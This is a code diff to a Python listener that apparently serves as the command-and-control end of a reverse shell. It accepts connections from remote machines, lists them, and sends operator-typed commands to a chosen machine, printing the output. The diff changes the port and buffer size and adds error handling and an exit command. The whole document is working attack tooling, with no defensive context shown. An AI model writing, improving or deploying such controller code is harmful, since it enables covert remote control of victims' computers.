@@ -3,7 +3,7 @@ import socket,time
 
 s = socket.socket()
 
-s.bind(('',40000))
+s.bind(('',40001))
 
 s.listen(5)
 
@@ -17,25 +17,34 @@ def accept_conn():
 		#print(add)
 		add_lis.append(add)
 		conn_lis.append(conn)
+		
 
 
 def control_pc():
 	while True:
-		print("LIST OF CONNECTIONS :")
-		
-		for i in add_lis:
-			print(add_lis.index(i),i[0],i[1])
-		selection = input(" select connection >>>")
-		if selection =='skip':
+		try:
+
+			print("LIST OF CONNECTIONS :")
+			
+			for i in add_lis:
+				print(add_lis.index(i),i[0],i[1])
+			selection = input(" select connection or type 'skip' to refresh:>>>")
+			if selection =='skip':
+				continue
+			conn = conn_lis[int(selection)]
+			while True:
+				cmd=input('>>')
+				if cmd=='end' or cmd=='END':
+					break
+				if cmd.lower() =='exit':
+					print("exiting program..")
+					exit()
+				conn.sendall(str.encode(cmd))
+				response = str(conn.recv(20480),'utf-8')
+				print(response)
+		except Exception as e:
+			print("error:",str(e))
 			continue
-		conn = conn_lis[int(selection)]
-		while True:
-			cmd=input('>>')
-			if cmd=='end' or cmd=='END':
-				break
-			conn.sendall(str.encode(cmd))
-			response = str(conn.recv(40820),'utf-8')
-			print(response)
 
 
 
